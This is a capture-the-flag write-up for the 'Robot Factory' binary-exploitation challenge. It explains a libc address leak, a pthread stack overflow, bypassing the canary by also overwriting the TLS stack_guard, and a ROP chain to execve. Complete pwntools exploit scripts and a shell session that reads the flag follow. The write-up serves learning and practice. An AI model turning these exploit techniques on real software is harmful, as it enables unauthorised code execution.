# Robot Factory

The description for this challenge is as follows:

*You've been asked to investigate the Build-A-Bot factory, where there's rumours of the robots acting strangely. Can you get them under control?*

The challenge was rated at 2 out of 4 stars, and it was worth 425 points at the end with a total of 16 solves. The downloadables for the challenge included the challenge binary and a libc file. I would say that the main challenges involved were reverse-engineering the binary to find the most straightforward exploitation path, as well as knowing about how pthreads affect canaries.

**TL;DR Solution:** Notice that we can get something like a libc leak with robot type 'n' and operation type 'a', as well as seemingly trigger a canary on robot type 's', operation type 'm' with certain inputs, indicating a stack overflow. Reverse engineer the 's' 'm' scenario to note that our input for string 1 is repeated by our entered size, plus one, and stored on the stack, causing overflows when sufficiently large. Note that when pthread is used, we can overwrite the stack_guard to equal whatever we overwrote the canary with. A carefully crafted ropchain, canary overwrite, and stack guard overwrite can then be used to gain shell access.

## Gathering Information

I started by running checksec on the file. The results showed that this is a typical x86-64 binary, with a canary, no PIE, and NX.
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/pwn_robot_factory$ checksec robot_factory
[*] '/home/knittingirl/CTF/HTB_Uni_Quals_21/pwn_robot_factory/robot_factory'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
A quick glance at the decompilation in Ghidra raised concerns that this would be another heap pwn problem due to the presence of malloc and free calls. However, I also noted the use of pthread; the only time that I had previously seen pthread in a pwn challenge, it was used in order to bypass a canary in a manner I will explain in more detail later on. This would indicate a ROP-based approach, which I find significantly simpler.
```
void main(void)

{
  pthread_t local_10;
  
  setvbuf(stdout,(char *)0x0,2,0);
  puts("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=");
  puts("|                                 |");
  puts("|  WELCOME TO THE ROBOT FACTORY!  |");
  puts("|    DAYS WITHOUT AN ACCIDENT:    |");
  puts("|               0                 |");
  puts("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=");
                    /* This is taking place in a pthread. I know that this can mess with canaries.
*/
  pthread_create(&local_10,(pthread_attr_t *)0x0,self_destruct_protocol,(void *)0x0);
  do {
                    /* this will get called repeatedly */
    create_robot();
  } while( true );
}
```
### Sort of a Libc Leak
Since the decompilation wasn't super clear, I opted to run the binary and try out some of the possible inputs to see if I noticed anything suspicious. Anything involving the 'n' kind of robot seemed to be printing out a large decimal number that seemed like it could translate to some sort of leak; in the example reproduced below, the number in hex is 0x7fb872d9cec8, which looks like a libc value.
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/pwn_robot_factory$ ./robot_factory 
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
|                                 |
|  WELCOME TO THE ROBOT FACTORY!  |
|    DAYS WITHOUT AN ACCIDENT:    |
|               0                 |
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
What kind of robot would you like? (n/s) > n
What kind of operation do you want? (a/s/m) > a
Enter number 1: 2
Enter number 2: 2
What kind of robot would you like? (n/s) > Result: 140430177586888
```
To test this theory out, I made a pwntools script with gdb attached that would produce those same inputs and, for convenience, auto-convert the "leak" to a hex address. Here is that script:
```
from pwn import *

target = process('./robot_factory', env={"LD_PRELOAD":"./libc.so.6"})

pid = gdb.attach(target, "b *create_robot+145\n set disassembly-flavor intel\ncontinue")

libc = ELF('libc.so.6')
elf = ELF('robot_factory')

#target = remote('64.227.40.93', 31059)

print(target.recvuntil(b'>'))
target.sendline(b'n')

print(target.recvuntil(b'>'))
target.sendline(b'a')

print(target.recvuntil(b'1:'))
target.sendline(b'2')

print(target.recvuntil(b'2:'))
target.sendline(b'2')

print(target.recvuntil(b'Result: '))

result = target.recvuntil(b'\n').strip()
print(result)

leak = int(result)
print('that number is at an address of', hex(leak))
target.interactive()
```
The relevant sub-section of results:
```
b' What kind of operation do you want? (a/s/m) >'
b' Enter number 1:'
b' Enter number 2:'
b' What kind of robot would you like? (n/s) > Result: '
b'140635357441736'
that number is at an address of 0x7fe83885eec8

```
Now, if I use vmmap in gdb, my leak is from an unidentified read-write section, but it does appear to a constant distance from the main libc section:
```
0x00007fe838060000 0x00007fe838860000 0x0000000000000000 rw- 
```
To check, I found the libc address of system on that particular run, and found that the difference between that address and my leak is 0x8a1548. When I reproduced this between runs, the offset remained consistent, giving me what effectively works as a libc leak that I can use to find the base address on each run.
```
gef➤  x/gx system
0x7fe839100410 <system>:	0x74ff8548fa1e0ff3

```
### Getting a Stack Overflow

When I started trying inputs with a robot kind of "s" and an operation kind of "m", I discovered something very interesting, namely that certain inputs could produce the "stack smashing detected" error that means you overwrote a canary.
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/pwn_robot_factory$ ./robot_factory 
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
|                                 |
|  WELCOME TO THE ROBOT FACTORY!  |
|    DAYS WITHOUT AN ACCIDENT:    |
|               0                 |
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
What kind of robot would you like? (n/s) > s
What kind of operation do you want? (a/s/m) > m
Enter string 1: aaaaaaaaaaaaaaaa
Enter size: 67
What kind of robot would you like? (n/s) > *** stack smashing detected ***: terminated
Aborted
```
Since this strongly suggests a stack overflow, I investigated further. If we look back at ghidra, the main meat of the program is occurring in a create_robot function. Regardless of the choices I make, it does another pthread with the function do_robot and argument robots[current_index].
```
    pthread_create(&local_28,(pthread_attr_t *)0x0,do_robot,(void *)robots[current_index]);
    *(pthread_t *)robots[current_index] = local_28;
```
After some dynamic and static analysis, I discovered that the 's' 'm' combination leads into do_string(), then multiply_func(). While I never fully reverse engineered what was going on, by placing breakpoints and stepping through the function, I was able to work out what was going on. As an aside, I've found that this works most reliably when you set up a breakpoint within create-thread where the first function actually gets called, specifically here with this libc: b *start_thread+213. Anyway, at the end of do_string, I can see that I've overwritten the canary with a's, and will trigger the stack smashing detection:
```
 0x4017fb <do_string+117>  mov    rax, QWORD PTR [rbp-0x8]
 →   0x4017ff <do_string+121>  sub    rax, QWORD PTR fs:0x28
     0x401808 <do_string+130>  je     0x40180f <do_string+137>
     0x40180a <do_string+132>  call   0x401070 <__stack_chk_fail@plt>
     0x40180f <do_string+137>  leave  
     0x401810 <do_string+138>  ret    
     0x401811 <do_num+0>       push   rbp
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "robot_factory", stopped 0x7f82c145c17c in read (), reason: BREAKPOINT
[#1] Id 2, Name: "robot_factory", stopped 0x7f82c142b3bf in clock_nanosleep (), reason: BREAKPOINT
[#2] Id 4, Name: "robot_factory", stopped 0x4017ff in do_string (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4017ff → do_string()
────────────────────────────────────────────────────────────────────────────────
gef➤  x/gx $rbp-0x8
0x7f82bbffeec8:	0x6161616161616161
gef➤  x/s $rbp-0x8
0x7f82bbffeec8:	'a' <repeats 824 times>
```
In addition, if I go ahead an find the beginning of my long string of a's, I see that it is 1088 characters long. I input a string of 16 a's for string 1, and 67 for size, and 1088 = 16 * 68, or string 1 length * (size + 1).
```
➤  x/s $rbp-0x110
0x7f82bbffedc0:	'a' <repeats 1088 times>
```
### Why the Canary is No Big Deal

Fortunately, the canary should not be a significant problem. When a function is called within a pthread, the Thread Local Storage (TLS) is stored near the stack and can be overwritten with a sufficiently large overflow. The canary is compared with the stack_guard value within the TLS, so if I ensure that the canary and the stack guard are overwritten with the same value, I will not trigger the smashing detection and can then create a nice ROP chain.

If I look at the decompilation of create_robot, I can see that I should be able to enter strings of up to 0x100 in length, and of any size supported by long integers. As a result, I should be able to achieve enough length to manage my stack guard overwrite.
```
      printf("Enter string 1: ");
      lVar1 = robots[current_index];
      alloced_area = malloc(0x100);
      *(void **)(lVar1 + 0x10) = alloced_area;
      fgets(*(char **)(robots[current_index] + 0x10),0x100,stdin);
...
        printf("Enter size: ");
                    /* ooh, stack smashing detected */
        __isoc99_scanf("%ld",robots[current_index] + 0x18);
        getchar();
```
I can illustrate this by increasing the size of the overwrite; in this example, I'm using a string 1 of 0x30 a's, and a size of 67.The canary still gets overwritten with a's:
```
gef➤  x/gx $rbp-0x8
0x7f8da9d20ec8:	0x6161616161616161
```
But the comparison works, and I instead error out because I've overwritten rsp with a's! All I have to do now is finesse my offsets to allow for a successful ROP.
```
 →   0x401808 <do_string+130>  je     0x40180f <do_string+137>	TAKEN [Reason: Z]
   ↳    0x40180f <do_string+137>  leave  
        0x401810 <do_string+138>  ret
```
As an aside, I found that exessively large payloads would cause issues with line multiply_func+124, on which a memcpy is performed. It seemed to be messing with the value in rdx and causing an error; I did not look into it further, but you need to take care when selecting a size.

## Writing the Exploit

I ended up doing a lot of the offset calculations via trial error; this was necessary since I had to consider repeats in my input string. I found that string 1 of 0xe0 a's and size of 10 would bypass the canary without causing further errors. I also experimented with adding varying amounts of non-a characters to the beginning and end, while maintaining an overall length of 0xe0, and determined that payloads like that shown below work:
```
payload = b'c' * 0x28 + b'a' * 8 + b'e' * 0x78 + b'a' * 8 + b'b' * 0x30
```
Both the canary and stackguard get set to 0x6161616161616161. I can then swap out the e's for a ropchain that starts with 8 bytes of padding, which gives me plenty of space to do whatever I like. Using the libc base I was able to derive earlier, I got a successful local solve like so:
```
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

pop_rdi = p64(0x0000000000401ad3) # : pop rdi ; ret
pop_rsi = p64(libc_base + 0x0000000000027529) # : pop rsi ; ret
pop_rdx_r12 = p64(libc_base + 0x000000000011c371) # : pop rdx ; pop r12 ; ret
execve = libc_base + libc.symbols['execve']

ropchain = b'e' * 8 + pop_rdi + p64(binsh) + pop_rsi + p64(0) + pop_rdx_r12 + p64(0) * 2 + p64(execve)
ropchain += b'f' * (0x78 - len(ropchain))
payload = b'c' * 0x28 + b'a' * 8 + ropchain + b'a' * 8 + b'b' * 0x30
target.sendline(payload)
print(target.recvuntil(b'size:'))

target.sendline(b'10')
target.interactive()
```
I discovered that this did not work remotely because my libc base seemed to be off. As a result, I created an alternative ropchain to leak the libc address for puts and compare it against the leak. Fortunately, I got a slightly different, but still consistent offset against the remote host. For reference, the offset between my leak and the libc address of puts turned out to be 0x8af6d8.
```
ropchain = b'e' * 8 + pop_rdi + p64(puts_got) + p64(puts_plt)
ropchain += b'f' * (0x78 - len(ropchain))

payload = b'c' * 0x28 + b'a' * 8 + ropchain + b'a' * 8 + b'b' * 0x30
print('This needs to be 0xe0', hex(len(payload)))

target.sendline(payload)
print(target.recvuntil(b'size:'))

target.sendline(b'10')

print(target.recvuntil(b'(n/s) > '))
new_leak = target.recv(6)
print(new_leak)
puts_libc = u64(new_leak + b'\x00' * 2)
print(hex(puts_libc))

print('as a reminder, the leak is at', hex(leak))
print('to get puts_libc, I need to add', hex(puts_libc - leak), 'to my leak')
target.interactive()

```
Here is the final script:
```
from pwn import *

#target = process('./robot_factory', env={"LD_PRELOAD":"./libc.so.6"})

#pid = gdb.attach(target, "b *create_robot+145\nb *do_string+138\nb *multiply_func+124\nb *do_robot\nb *start_thread+213\n set disassembly-flavor intel\ncontinue")


libc = ELF('libc.so.6')
elf = ELF('robot_factory')

target = remote('64.227.38.214', 30031)

#Getting libc leak:

print(target.recvuntil(b'>'))
target.sendline(b'n')

print(target.recvuntil(b'>'))
target.sendline(b'a')

print(target.recvuntil(b'1:'))
target.sendline(b'2')

print(target.recvuntil(b'2:'))
target.sendline(b'2')

print(target.recvuntil(b'Result: '))

result = target.recvuntil(b'\n').strip()
print(result)

leak = int(result)

puts_libc = leak + 0x8af6d8
libc_base = puts_libc - libc.symbols['puts']


#print(target.recvuntil(b'>'))
target.sendline(b's')

print(target.recvuntil(b'>'))
target.sendline(b'm')

print(target.recvuntil(b'1:'))

binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

pop_rdi = p64(0x0000000000401ad3) # : pop rdi ; ret
pop_rsi = p64(libc_base + 0x0000000000027529) # : pop rsi ; ret
pop_rdx_r12 = p64(libc_base + 0x000000000011c371) # : pop rdx ; pop r12 ; ret
execve = libc_base + libc.symbols['execve']
printf_libc = libc_base + libc.symbols['printf']
puts_libc = libc_base + libc.symbols['puts']
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']

#My libcs are off, but the ROPchain basically works
ropchain = b'e' * 8 + pop_rdi + p64(binsh) + pop_rsi + p64(0) + pop_rdx_r12 + p64(0) * 2 + p64(execve)
#I used this alternate ropchain:
#ropchain = b'e' * 8 + pop_rdi + p64(puts_got) + p64(puts_plt)
ropchain += b'f' * (0x78 - len(ropchain))

payload = b'c' * 0x28 + b'a' * 8 + ropchain + b'a' * 8 + b'b' * 0x30
print('This needs to be 0xe0', hex(len(payload)))

target.sendline(payload)
print(target.recvuntil(b'size:'))

target.sendline(b'10')
#target.interactive()

#And this stuff down here to get the remote offset for my libc leak. This way I didn't have to deal with looping back to main.
'''
print(target.recvuntil(b'(n/s) > '))
new_leak = target.recv(6)
print(new_leak)
puts_libc = u64(new_leak + b'\x00' * 2)
print(hex(puts_libc))

print('as a reminder, the leak is at', hex(leak))
print('to get puts_libc, I need to add', hex(puts_libc - leak), 'to my leak')
'''
target.interactive()
```
And here are the results when I run it:
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/pwn_robot_factory$ python3 robot_factory_writeup.py 
[*] '/home/knittingirl/CTF/HTB_Uni_Quals_21/pwn_robot_factory/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/knittingirl/CTF/HTB_Uni_Quals_21/pwn_robot_factory/robot_factory'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 64.227.38.214 on port 30031: Done
b'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n|                                 |\n|  WELCOME TO THE ROBOT FACTORY!  |\n|    DAYS WITHOUT AN ACCIDENT:    |\n|               0                 |\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\nWhat kind of robot would you like? (n/s) >'
b' What kind of operation do you want? (a/s/m) >'
b' Enter number 1:'
b' Enter number 2:'
b' What kind of robot would you like? (n/s) > Result: '
b'140352903917256'
b'\x00What kind of operation do you want? (a/s/m) >'
b' Enter string 1:'
This needs to be 0xe0 0xe0
b' Enter size:'
[*] Switching to interactive mode
 What kind of robot would you like? (n/s) > $ ls
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag.txt
HTB{th3_r0b0t5_4r3_0utt4_c0ntr0l!}
$  

```
Thanks for reading!
